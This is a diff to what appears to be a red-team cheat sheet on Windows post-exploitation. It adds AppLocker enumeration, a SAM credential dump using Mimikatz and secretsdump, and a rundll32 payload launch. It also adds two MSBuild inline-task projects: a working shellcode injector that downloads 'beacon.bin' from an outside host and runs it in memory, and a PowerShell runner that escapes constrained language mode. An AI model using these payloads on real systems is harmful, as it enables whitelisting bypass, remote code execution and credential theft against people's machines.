@@ -380,18 +380,20 @@ Get-PSSessionConfiguration
 - DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
 - Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList
 
-#### Check if applocker policy is running
+#### Check if Applocker is enabled
 ```
 Get-AppLockerPolicy -Effective
 ```
 
-#### Enumerate applocker policy
+#### Enumerate Applocker policy
 ```
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
-#### Check applocker policy in registery
 ```
+Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
+Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
+
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
 ```
 
@@ -419,7 +421,7 @@ runas /netonly /user:<DOMAIN\<USER> cmd.exe
 winrs -r:<PC NAME> cmd
 ```
 
-#### Check for the policy
+#### Check for the policy on idsk
 - ```.p7b``` is a signed policy
 - Check if there are any ```.xml``` files which didn't got removed with the policy
 ```
@@ -446,6 +448,138 @@ reg save HKLM\SAM sam.bak
 
 Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
 secretsdump.py -sam sam.bak -security security.bak -system system.bak local
+```
+
+#### rundll32.exe dll payload
+```
+C:\Windows\System32\rundll32.exe <FILE>.dll,StartW
+```
+
+#### Msbuilt.exe
+- Can be used to execute arbitrary C# code from a `.csproj` or `.xml` file.
+- Example shellcode injector
+```
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+   <MSBuildTest/>
+  </Target>
+   <UsingTask
+    TaskName="MSBuildTest"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+
+            using System;
+            using System.Net;
+            using System.Runtime.InteropServices;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+
+            public class MSBuildTest :  Task, ITask
+            {
+                public override bool Execute()
+                {
+                    byte[] shellcode;
+                    using (var client = new WebClient())
+                    {
+                        client.BaseAddress = "http://nickelviper.com";
+                        shellcode = client.DownloadData("beacon.bin");
+                    }
+      
+                    var hKernel = LoadLibrary("kernel32.dll");
+                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
+                    var hCt = GetProcAddress(hKernel, "CreateThread");
+
+                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
+                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
+
+                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
+                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
+
+                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
+                    WaitForSingleObject(t, 0xFFFFFFFF);
+
+                    return true;
+                }
+
+            [DllImport("kernel32", CharSet = CharSet.Ansi)]
+            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+    
+            [DllImport("kernel32", CharSet = CharSet.Ansi)]
+            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32")]
+            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+            }
+
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
+
+- Example PowerShell clm
+```
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+   <MSBuildTest/>
+  </Target>
+   <UsingTask
+    TaskName="MSBuildTest"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+     <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+
+            using System;
+            using System.Linq;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+
+            public class MSBuildTest :  Task, ITask
+            {
+                public override bool Execute()
+                {
+                    using (var runspace = RunspaceFactory.CreateRunspace())
+                    {
+                      runspace.Open();
+
+                      using (var posh = PowerShell.Create())
+                      {
+                        posh.Runspace = runspace;
+                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
+                                                
+                        var results = posh.Invoke();
+                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
+                        
+                        Console.WriteLine(output);
+                      }
+                    }
+
+                return true;
+              }
+            }
+
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
 ```
 
 ## Defeating AV
